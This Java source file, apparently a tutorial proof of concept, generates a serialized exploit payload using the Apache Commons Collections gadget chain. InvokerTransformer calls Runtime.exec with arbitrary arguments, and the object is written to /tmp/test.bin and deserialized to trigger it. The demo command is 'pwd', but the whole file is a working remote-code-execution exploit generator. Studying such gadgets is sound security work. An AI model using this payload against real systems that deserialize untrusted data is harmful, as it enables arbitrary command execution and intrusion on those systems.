package com.github.inza9hi.tutorial.poc.security;

/**
 * Created by lawulu on 15-11-24.
 */

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/**
 * @ClassName: Main.java
 * @Description: TODO
 * @author iswin
 * @email admin@iswin.org
 * @Date 2015年11月8日 下午12:12:13
 */
public class CommonCollecionts {

    public static Object Reverse_Payload(String[] execArgs) throws Exception {
        final Transformer[] transforms = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, execArgs), new ConstantTransformer(1) };

        Transformer transformerChain = new ChainedTransformer(transforms);
        Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);

        Class cls = Class
                .forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Retention.class, outmap);
        return instance;

    }

    public static void main(String[] args) throws Exception {
        GeneratePayload(Reverse_Payload(new String[]{"pwd"}),
                "/tmp/test.bin");
    }

    public static void GeneratePayload(Object instance, String file)
            throws Exception {
        File f = new File(file);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
        out.flush();
        out.close();
    }

    public static void payloadTest(String file) throws Exception {
        // 这里为测试上面的tansform是否会触发payload
        // Map.Entry onlyElement =(Entry) outmap.entrySet().iterator().next();
        // onlyElement.setValue("foobar");

        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
        in.readObject();
        in.close();
    }
}